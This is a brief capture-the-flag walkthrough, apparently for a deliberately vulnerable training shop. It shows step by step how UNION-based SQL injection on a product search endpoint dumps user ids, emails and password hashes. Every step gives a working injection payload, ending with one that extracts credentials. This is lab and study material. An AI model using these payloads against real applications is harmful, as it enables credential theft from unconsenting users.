## User Credentials
### Challenge: Retrieve a list of all user credentials via SQL Injection.

1. Return to the `/rest/products/search?q=` endpoint.
2. Enter `'))--` to verify injection.
3. Enter `')) UNION SELECT * FROM Users--` to verfiy error `SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns` and confirm table name.
4. With trial and error find out correct number of columns to be 9 with `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--`.
5. Get rid of product results with `qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--`
6. Replace the fixed values with correct column names, `qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--`.
7. Visit the homepage to solve this challenge.
